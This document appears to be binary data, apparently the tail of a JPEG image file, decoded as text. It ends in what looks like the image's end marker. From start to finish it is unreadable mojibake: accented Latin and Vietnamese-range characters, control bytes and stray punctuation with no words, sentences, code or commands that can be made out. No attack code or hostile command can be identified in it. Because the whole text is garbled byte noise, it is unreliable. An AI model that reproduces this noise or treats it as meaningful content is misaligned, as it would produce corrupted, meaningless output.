ñQ3KJ¶…Ù‚Ù±̀œ{|yë1˜̀f<º́˜đá6ÓÚi
$`ˆ¼I¿=  \’N@$ 8b;àçU¤­t<$	q×»–xæŸ,~ ®î‹vØ=-aib?5¨k–tPb&h´»_ßBy—á€ÿ ÿ o;W8%=¯ư8Ÿè@¿B‚rÖ×/soÛæ,t{é½dg£QTµ¾ôq:ƒc²o\'KTy¹Ơÿ ú?\pæ¸R¶g
P}Ấ’¬³ÿ ½Ô4;˜Û—w	¸¸âBî¼0Q₫ŸçĂcm¦>Ä·™	ÿ ˜èÿ àÇ”›aËˆä†Xî	Y<·"È̀Q­Ă:ª “¦=Ëa¢à¾û”éŒÆc1ÂêË1˜̀f?/VÁp÷° âÇĐ3CcaÇ
öÎƯ1ÚÍPVä‘tOơ²Û¯¹µ!è¡ØJÛœÅVU»L£tƒ~¦j%$®XJ©¹V)?ÚL@$rŒ1Ó2Ü)Lú/ –,NËØË.«r]]¤vƠå‘×Å#Ÿ¬zX     Ås¥]Đ~˜̉°₫Ë!í[Oéû§J\9C†ÊQ‡($Ơ(Å¢UaTM„JqƯ[8#Zä°>E„‘al+\k®”Æp¥eÂ0q°|EÔà§¦Â˜äĂ\/…±> {Ql)ºfÂIç8A;âFÊƠé²GÂi»á<¯‚›+z ƯK'E’6ÊøÙÛ	f|ÙÙƠú9:$ơá,z•YGâ@ÆÓJ7vâ™e–LÅ¢– €-ûÄÔÛR|‰·–;±ŒŒï²æ›–Y.-tjÚe· ĂÍ‡½³îúœGÜă.î7[µ9
jÔœ7Ïvg¥y6Ë":°¹ª)ÿ 5Ú•™U¨¢T Î4
̃/‡q©ÀmÎÓpŒ%Đ¦®É;m¤ÚèƯÖhjbçSeCË0 ‘$Mî̀„©¾Vº‰Ó¡ÊOƠ:ôÅùBT¾ÍjÊzz*«Á$fÄ+·6³ÄyÆÀ©°Ó‹±î—ilÊÊíD	$Ø*™ ³¿_đÁ½27s&Q¨Kñ˜ôằUœ¬f3ŒÇÓ”¢V…ăv˜ ¬
óq̣µ¸ăđË¾;a©àd
Z4,¡®V₫`1è‰ËĂ(:§›ăÛâ’m_•Î×V‘WæÀ }	Đt₫wÂ‡̣ Ú̉0
$6¿ưñÁÊv¸;etq˜Œöo¼RỦĂ<¹s¸9²‚†Ü	?®$Øó¹q\™
–c1˜̀~î\¿	Z³"l5'€·Êó´ª½—³´OÜÍQ#Âf̣F‚&{ÄO…ÚÙ± ›e6#¶S’lTrN ÑL7Ïµơa³6qIö‹²Ç4º<4y¬I{4È§?uÁ@̀ü‘æ»d¬(f>)$sy%’5…Ùˆ̣ h  V>B;¿¦j‚LQ»̀Ï9/+±:—bˆ›Ûă‹cb{;6Q°P;(h'r.¤ÔÇÁê§øâµ@˜²”^Àô8®8ù1°9y¯Åf§€Ë“/Rˆ0º6Ă|YĂ+ª’™G ä–FØQFØ[t́êe$ÈF«a$-·Àff”[i$—F—²a;¾1[»Ö©'›á8m€á|8̣5_ÿÙ
